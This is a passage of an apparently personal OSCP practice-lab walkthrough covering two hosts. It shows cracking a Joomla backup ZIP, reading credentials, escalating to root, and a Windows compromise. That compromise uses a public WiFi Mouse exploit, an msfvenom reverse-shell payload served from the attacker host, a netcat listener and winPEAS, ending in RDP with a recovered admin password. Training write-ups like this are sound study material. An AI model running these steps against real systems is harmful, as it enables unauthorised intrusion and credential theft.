Loaded 19 password hashes with 19 different salts (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Loaded hashes with cost 1 (HMAC size) varying from 28 to 6535
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
codeblue         (sitebackup3.zip/joomla/language/.DS_Store)     
codeblue         (sitebackup3.zip/joomla/includes/app.php)     
codeblue         (sitebackup3.zip/joomla/web.config.txt)     
codeblue         (sitebackup3.zip/joomla/cli/joomla.php)     
codeblue         (sitebackup3.zip/joomla/cli/index.html)     
codeblue         (sitebackup3.zip/joomla/htaccess.txt)     
codeblue         (sitebackup3.zip/joomla/LICENSE.txt)     
codeblue         (sitebackup3.zip/joomla/includes/index.html)     
codeblue         (sitebackup3.zip/joomla/language/overrides/index.html)     
codeblue         (sitebackup3.zip/joomla/cache/index.html)     
codeblue         (sitebackup3.zip/joomla/includes/defines.php)     
codeblue         (sitebackup3.zip/joomla/README.txt)     
codeblue         (sitebackup3.zip/joomla/language/index.html)     
codeblue         (sitebackup3.zip/joomla/.DS_Store)     
codeblue         (sitebackup3.zip/joomla/includes/framework.php)     
codeblue         (sitebackup3.zip/joomla/index.php)     
codeblue         (sitebackup3.zip/joomla/configuration.php)     
codeblue         (sitebackup3.zip/joomla/robots.txt)     
codeblue         (sitebackup3.zip/joomla/tmp/index.html)     
19g 0:00:00:11 DONE (2024-02-18 20:03) 1.656g/s 3571p/s 67850c/s 67850C/s holabebe..loserface1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

7. Unzip configuration.php and find chloe creds. 
```
public $secret = 'Ee24zIK4cDhJHL4H';
```

8. Change user to chloe, figured out it was root user and get proof.txt
```
stuart@oscp:/home$ su chloe
Password: Ee24zIK4cDhJHL4H


chloe@oscp:~$ sudo -l
[sudo] password for chloe: 
Matching Defaults entries for chloe on oscp:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User chloe may run the following commands on oscp:
    (ALL : ALL) ALL
chloe@oscp:~$ sudo su
root@oscp:/home/chloe# ls
root@oscp:/home/chloe# cd /root
root@oscp:~# ls
proof.txt  snap
root@oscp:~# cat proof.txt
3c52cb51458b65d1eda98c6ffada69c9

```

#### 145
1. Rustscan 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ rustscan 192.168.213.145 

PORT     STATE SERVICE       REASON
21/tcp   open  ftp           syn-ack
80/tcp   open  http          syn-ack
135/tcp  open  msrpc         syn-ack
139/tcp  open  netbios-ssn   syn-ack
445/tcp  open  microsoft-ds  syn-ack
1978/tcp open  unisql        syn-ack
3389/tcp open  ms-wbt-server syn-ack
```

3. Nmap scan 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ nmap -p$(cat 145-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.213.145 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-18 20:56 EST
Nmap scan report for 192.168.213.145
Host is up (0.31s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Samuel's Personal Site
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1978/tcp open  unisql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    system windows 6.2
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-02-19T02:00:24+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: oscp
|   DNS_Computer_Name: oscp
|   Product_Version: 10.0.19041
|_  System_Time: 2024-02-19T01:59:45+00:00
| ssl-cert: Subject: commonName=oscp
| Not valid before: 2023-11-29T11:57:43
|_Not valid after:  2024-05-30T11:57:43
1 service unrecognized despite returning data. If you know the sern, please submit the following fingerprint at https://nmap.org/cgi.cgi?new-service :
SF-Port1978-TCP:V=7.94SVN%I=7%D=2/18%Time=65D2B56E%P=x86_64-pc-lin
SF:(NULL,14,"system\x20windows\x206\.2\n\n")%r(GenericLines,14,"sy
SF:windows\x206\.2\n\n")%r(GetRequest,14,"system\x20windows\x206\.
SF:r(HTTPOptions,14,"system\x20windows\x206\.2\n\n")%r(RTSPRequest
SF:tem\x20windows\x206\.2\n\n")%r(RPCCheck,14,"system\x20windows\x
SF:\n")%r(DNSVersionBindReqTCP,14,"system\x20windows\x206\.2\n\n")
SF:atusRequestTCP,14,"system\x20windows\x206\.2\n\n")%r(Help,14,"s
SF:0windows\x206\.2\n\n")%r(SSLSessionReq,14,"system\x20windows\x2
SF:n")%r(TerminalServerCookie,14,"system\x20windows\x206\.2\n\n")%
SF:sionReq,14,"system\x20windows\x206\.2\n\n")%r(Kerberos,14,"syst
SF:ndows\x206\.2\n\n")%r(SMBProgNeg,14,"system\x20windows\x206\.2\
SF:X11Probe,14,"system\x20windows\x206\.2\n\n")%r(FourOhFourReques
SF:stem\x20windows\x206\.2\n\n")%r(LPDString,14,"system\x20windows
SF:\n\n")%r(LDAPSearchReq,14,"system\x20windows\x206\.2\n\n")%r(LD
SF:q,14,"system\x20windows\x206\.2\n\n")%r(SIPOptions,14,"system\x
SF:s\x206\.2\n\n")%r(LANDesk-RC,14,"system\x20windows\x206\.2\n\n"
SF:inalServer,14,"system\x20windows\x206\.2\n\n")%r(NCP,14,"system
SF:ows\x206\.2\n\n")%r(NotesRPC,14,"system\x20windows\x206\.2\n\n"
SF:RMI,14,"system\x20windows\x206\.2\n\n")%r(WMSRequest,14,"system
SF:ows\x206\.2\n\n")%r(oracle-tns,14,"system\x20windows\x206\.2\n\
SF:-sql-s,14,"system\x20windows\x206\.2\n\n")%r(afp,14,"system\x20
SF:x206\.2\n\n")%r(giop,14,"system\x20windows\x206\.2\n\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-02-19T01:59:46
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results amap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 212.21 seconds
```

3. Found out service unisql which was vulnerable to wifi mouse from google
```
https://www.exploit-db.com/exploits/50972
```

4. Prepare exploits
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.242 LPORT=443 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe

┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ python 50972.py 192.168.213.145 192.168.45.242 reverse.exe
[+] 3..2..1..
[+] *Super fast hacker typing*
[+] Retrieving payload
[+] Done! Check Your Listener?

```

5. Obtained reverse shell and local.txt
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ nc -nvlp 443 
listening on [any] 443 ...
connect to [192.168.45.242] from (UNKNOWN) [192.168.213.145] 53348
Microsoft Windows [Version 10.0.19041.1]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>ls

C:\Users\offsec\Desktop>type local.txt
type local.txt
5d2a5ee73bdaee89081a92608b3cee2d

```

6. Found another user zachary as administrator and run winpeas. Found password ot zachary. 
```
PS C:\Users\offsec\Desktop> iwr -uri http://192.168.45.242/winPEASx64.exe -Outfile winpeas.exe
iwr -uri http://192.168.45.242/winPEASx64.exe -Outfile winpeas.exe
PS C:\Users\offsec\Desktop> .\winpeas.exe


   RegKey Name: zachary
    RegKey Value: "&('C:\Program Files\PuTTY\plink.exe') -pw 'Th3R@tC@tch3r' zachary@10.51.21.12 'df -h'"

```

7. RDP login and found proof on admin desktop. 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ xfreerdp /cert-ignore /u:zachary /p:'Th3R@tC@tch3r' /v:192.168.213.145 


91fb41464003a662f05530d761274cb9
```







